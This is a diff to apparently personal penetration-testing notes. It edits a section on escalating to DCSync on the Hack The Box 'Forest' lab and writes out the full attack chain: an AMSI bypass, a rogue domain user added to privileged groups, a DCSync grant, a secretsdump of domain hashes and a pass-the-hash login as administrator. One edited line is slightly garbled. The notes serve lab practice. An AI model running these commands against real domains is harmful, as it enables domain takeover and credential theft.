@@ -2873,21 +2873,23 @@ hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
 ```
 
 ### Account Operator and WriteDacl or DCSync AD 
-- I saw the bloowhound has the WriteDACL and DCSync attack
+- I saw the bloodhound has the WriteDACL and WriteDACL attack
 - I situation where user in account operator group the user create users add into groups [article](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators)
-- And create the user add into groups try the DCSync attack
+- And create the user add into groups try the DCSync with created user
 
 ```powershell
 Bypass-4MSI # Bypass powershell 
 upload PowerView.ps1
 . .\PowerView.ps1
 net user ashok Ashok@123 /add /domain # Forest HTB
-net group "Exchange Windows Permissions" /add ashok # This group found in the Bloodhound report
-net localgroup "Remote Management Users" /add ashok
+net group "Exchange Windows Permissions" /add ashok # This group name found in the Bloodhound report
+net localgroup "Remote Management Users" /add ashok  # You will get shell accesss like evil-winrm
 $pass = convertto-securestring 'Ashok@123' -asplain -force
-$creds = new-object system.management.automation.pscredential('htb\ashok',$pass)
-Add-ObjectACL -PrincipalIdentity ashok -Credential $cred -Rights DCSync
+$creds = new-object system.management.automation.pscredential('htb.local\ashok',$pass)
+Add-ObjectACL -PrincipalIdentity ashok -Credential $creds -Rights DCSync  # After running this command then go for secretsdump
+#Latest powerview (Add-DomainObjectAcl -Credential $Creds -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ashok -Rights DCSync)
 impacket-secretsdump htb/ashok:'Ashok@123'@10.10.10.161  # After success of above command
+impacket-wmiexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 ```
 
 
